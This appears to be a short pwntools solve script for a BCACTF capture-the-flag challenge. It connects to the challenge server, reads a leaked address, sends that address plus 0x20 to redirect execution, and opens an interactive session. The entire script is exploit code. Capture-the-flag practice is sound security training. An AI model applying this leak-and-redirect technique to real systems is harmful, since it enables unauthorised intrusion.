from pwn import *

p = remote("challs.bcactf.com", "30810")

p.recvuntil(b"in is ")

leak = int(p.recvline(), 0)
log.info(f"{leak = :#x}")

p.sendlineafter(b"> ", f"{leak + 0x20:#x}".encode())

p.interactive()